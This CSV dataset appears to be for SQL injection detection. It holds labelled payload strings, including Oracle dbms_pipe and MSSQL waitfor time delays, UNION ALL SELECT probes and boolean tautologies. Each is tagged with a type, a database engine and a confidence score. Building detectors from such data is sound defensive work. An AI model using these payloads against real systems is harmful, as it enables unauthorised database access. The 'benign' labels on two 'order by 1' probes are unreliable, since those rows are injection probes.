id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22084,"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22087,"1' ) ) as qzyp where 5081 = 5081 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22107,"1 ) ) as myyh where 5116 = 5116 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22140,"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22141,"1%' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22095,-9429' ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
22192,waitfor delay '0:0:5' and ( ( ( 'ozjl' like 'ozjl,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22196,"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
22198,1 ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
22000,"-7868"" union all select 1805--",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
22002,-3821' ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
22011,"1 where 2914 = 2914 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
22012,"1"" and 2006 = 2006",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
22019,"-9837"" where 7201 = 7201 union all select 7201,7201,7201--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
22021,"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
22025,"1%' ) ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
22026,-3998' ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
22027,"-2862' ) ) ) union all select 6649,6649--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
22032,"-9583' ) ) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
22036,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
22042,"-3102 ) union all select 6707,6707,6707,6707--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
22044,"-9634' ) ) ) union all select 4141,4141#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
22045,"-5640"" ) ) or 9792 = 2728--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
22047,-5764 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
22050,1 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 25 chars.,2
22052,1' where 8159 = 8159 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
22053,"1"" ) as uuth where 8555 = 8555 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
22057,-4313%' ) or 6872 = 6872 and ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
22060,"-9861' union all select 5710,5710,5710,5710,5710--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
22061,"1 where 8273 = 8273 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
22066,"-6112"" ) union all select 8203,8203,8203,8203,8203,8203,8203--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
22069,"1"" ) ) ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
22078,"-1055' union all select 7758,7758,7758,7758,7758,7758--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
22079,"-2630' ) ) as xavw where 6291 = 6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",union_based,generic,0.7,UNION-based payload detected. Payload length: 99 chars.,2
22080,"1' where 8451 = 8451 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
22082,-8447 where 2850 = 2850 or 7147 = 3262,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
22088,-3937 ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
22094,1 and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
22099,"1%"" union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
22114,"-2287' ) ) union all select 1200,1200,1200,1200,1200#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
22121,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
22123,"-6307' where 8916 = 8916 union all select 8916,8916,8916,8916,8916,8916,8916--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
22125,1 ) ) union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 28 chars.,2
22126,"-4955%' union all select 5928,5928--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
22131,-4901 ) or 3407 = 6442#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22132,1' where 4134 = 4134 and 1102 = 6300--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
22137,"-3604' ) as fyev where 7259 = 7259 union all select 7259,7259,7259,7259--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
22138,-6433%' ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
22139,-8836%' ) or 4856 = 3891,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
22143,"1"" ) as jiyl where 4893 = 4893 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
22144,-3243 or 2266 = 3583#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
22145,"1' ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
22149,-9120' ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
22151,-9389' ) or 8859 = 3989--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
22152,"-9923%' ) ) ) union all select 8985,8985,8985,8985,8985,8985,8985#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
